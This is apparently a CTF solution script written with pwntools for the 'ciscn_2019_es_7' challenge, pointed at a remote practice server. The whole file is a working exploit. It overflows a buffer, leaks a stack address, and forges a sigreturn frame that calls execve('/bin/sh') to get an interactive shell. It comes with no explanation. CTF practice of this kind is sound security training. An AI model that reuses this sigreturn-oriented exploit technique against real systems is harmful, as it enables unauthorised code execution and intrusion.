from pwn import *
from LibcSearcher import *

import utils

context.arch = 'amd64'
context.log_level = 'debug'
context.os = 'linux'

elf = ELF('../ciscn_2019_es_7')
target = remote('node4.buuoj.cn', 28821)

vuln = elf.sym['vuln']
syscall = 0x400517
gadget = 0x4004DA

payload = b'a' * 0x10 + p64(vuln)
target.sendline(payload)

stack_addr = u64(target.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x118

sigframe = SigreturnFrame()
sigframe.rax = 59
sigframe.rdi = stack_addr
sigframe.rip = syscall
sigframe.rsi = 0x0

payload = b'/bin/sh\x00' * 0x2 + \
    p64(gadget) + p64(syscall) + bytes(sigframe)

target.send(payload)
target.interactive()
